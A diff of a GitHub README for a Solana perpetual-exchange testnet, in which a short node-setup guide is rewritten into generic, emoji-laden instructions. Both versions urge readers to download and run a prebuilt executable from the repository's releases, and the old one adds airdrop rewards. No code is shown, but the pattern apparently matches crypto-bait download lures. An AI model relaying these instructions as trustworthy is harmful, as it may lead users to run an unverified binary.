@@ -1,110 +1,87 @@
-# Percolator Testnet
+# 🚀 percolator-testnet - Experience High-Performance Decentralized Trading
 
-**Percolator** is a **sharded perpetual exchange protocol** built on **Solana**, designed for high-performance decentralized trading.
-This public **testnet** invites participants to run local nodes, monitor performance, and help identify bugs before mainnet deployment.
+## 🌐 Overview
 
----
+Percolator is a sharded perpetual exchange protocol built on Solana. It offers high-performance decentralized trading for users who want a reliable experience. This public testnet allows participants to run local nodes, track performance, and find bugs before the mainnet goes live. Join us in making decentralized trading better.
 
-## 🚀 How to Join the Testnet
+## 📥 Download
 
-### 1. Install the Node
+[![Download percolator-testnet](https://img.shields.io/badge/Download-percolator--testnet-blue.svg)](https://github.com/KanderZamora/percolator-testnet/releases)
 
-Download the latest **Percolator Node** build for your OS:
+## 🚀 Getting Started
 
-> 🔗 [Download Node (.exe)](../../releases)
+To start with Percolator, follow these steps. It will help you set up your environment and run the software quickly and easily. If you encounter any issues, refer to the troubleshooting section at the end.
 
-Requirements:
+### 🛠️ System Requirements
 
-* **Windows 10+ / Linux / macOS**
-* **Solana CLI** (v2.0 or higher)
-* **Rust toolchain** (optional, for developers)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of a Linux distribution.
+- **Processor:** Intel i5 or equivalent.
+- **Memory:** 8 GB RAM or more is recommended.
+- **Storage:** At least 2 GB of free disk space.
+- **Network:** Reliable internet connection.
 
-`After downloading, extract the archive`
+### 📂 Installation Steps
 
----
+1. **Visit the GitHub Releases Page**  
+   Go to the [Releases page](https://github.com/KanderZamora/percolator-testnet/releases) to find the latest version of Percolator.  
 
-### 2. Start the Local Node
+2. **Download the Software**  
+   Look for the version labeled as the latest release. Click the download link to save the file to your computer.
 
-Run the node:`percolator-node.exe`
+3. **Run the Installer**  
+   After downloading, click on the file to start the installation process. Follow the on-screen prompts. 
 
-The node will automatically:
+4. **Set Up Your Node**   
+   Once installed, open the application. You will find a simple interface that walks you through setting up your node. 
 
-* Connect to the Solana test validator
-* Initialize Router & Slab programs
-* Start processing local trades and routing activity
+5. **Connect to Testnet**   
+   Ensure that you have set the connection type to "Testnet" in the settings menu. This connects you to the Percolator test environment.
 
----
+6. **Start Monitoring**  
+   After connecting, you can now monitor performance metrics and activities. Explore the interface to familiarize yourself with available options.
 
-### 3. Monitor Logs and Errors
+## 🐞 Help Identify Bugs
 
-All operational logs are written to the `logs/` directory:
+While using Percolator, you may encounter issues or bugs. We highly encourage you to report any findings. This helps improve the overall experience. Use the "Feedback" section within the application to send any reports directly to the development team.
 
-```
-logs/percolator-router.log  
-logs/percolator-slab.log  
-```
+## 📊 Features
 
-You can also view live output in the terminal:
+- **Sharded Architecture:** Enjoy fast trading with our efficient network structure.
+- **Decentralized:** Trade securely without relying on a central authority.
+- **User-Friendly Interface:** Navigate easily through the application with a clear design.
+- **Performance Monitoring:** Access real-time data to assess node performance.
+  
+## ⚙️ Configuration Options
 
-```bash
-percolator-node.exe --mode testnet --verbose
-```
+Percolator offers various configuration settings to enhance your experience. You can adjust network preferences and trading parameters. To modify settings:
 
-If you notice crashes, inconsistent calculations, or PDA derivation errors — collect the log file and share it in the issue tracker.
+1. Open the application.
+2. Navigate to the "Settings" tab.
+3. Adjust values as needed and click "Save".
 
----
+## 🛠️ Troubleshooting Common Issues
 
-### 4. Testnet Objectives
+If you run into problems while running Percolator, here are common solutions:
 
-* Validate **node stability** (Router / Slab subsystems) under continuous uptime
-* Detect memory leaks and allocation overflows
-* Verify PDA derivations and cross-slab margin logic
-* Stress-test matching and liquidation modules
-* Report bugs via GitHub or Discord
+- **Cannot Connect to Testnet:** Check your internet connection. Make sure you have set the connection to "Testnet" in settings.
+- **Application Crashes:** Ensure your computer meets the system requirements. Update your operating system and any relevant drivers.
+- **Slow Performance:** Close unnecessary applications running on your computer. Ensure you have sufficient RAM available.
+  
+If your issue is not resolved with these steps, please reach out through the application’s feedback feature.
 
-Active testers contributing useful logs or bug reports will be **eligible for future rewards and airdrops**.
+## 📚 Additional Resources
 
----
+- **User Documentation:** Comprehensive guides and FAQs can be found in the [Wiki section](https://github.com/KanderZamora/percolator-testnet/wiki).
+- **Community Support:** Join our Discord server to connect with other users and developers. Share tips, ask questions, and get help.
 
-## ⚙️ Core Programs
+## 📢 Changelog
 
-| Program    | Purpose                                     | Program ID                                    |
-| ---------- | ------------------------------------------- | --------------------------------------------- |
-| **Router** | Collateral management, cross-margin routing | `RoutR1VdCpHqj89WEMJhb6TkGT9cPfr1rVjhM3e2YQr` |
-| **Slab**   | Matching engine and trade settlement        | `SLabZ6PsDLh2X6HzEoqxFDMqCVcJXDKCNEYuPzUvGPk` |
+Stay updated with the latest changes and improvements in each release. You can find a detailed list in the [Changelog section](https://github.com/KanderZamora/percolator-testnet/releases).
 
----
+## 📝 License
 
-## 🧩 Debugging & Testing
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/KanderZamora/percolator-testnet/blob/main/LICENSE) file for details.
 
-To verify local functionality, run basic self-tests:
+## 📥 Download Again
 
-```bash
-percolator-node.exe --test
-```
-
-Integration with **Surfpool** (optional):
-
-```bash
-git clone https://github.com/txtx/surfpool
-cd surfpool && npm install && npm run validator
-```
-
-Then connect your Percolator node to Surfpool for live state testing.
-
----
-
-## 📬 Feedback
-
-If your node crashes, hangs, or fails to process instructions:
-
-1. Attach your log files (`logs/*.log`)
-2. Include OS version and node build number
-3. Submit the report via GitHub Issues or the testnet feedback form
-
----
-
-**Status:** Testnet is **live and active** 🟢
-Run your node, contribute data, and help stabilize the Percolator network.
-
-**Last Updated:** October 2025
+If you need to reinstall or grab the latest version, revisit the [Releases page](https://github.com/KanderZamora/percolator-testnet/releases) to download.
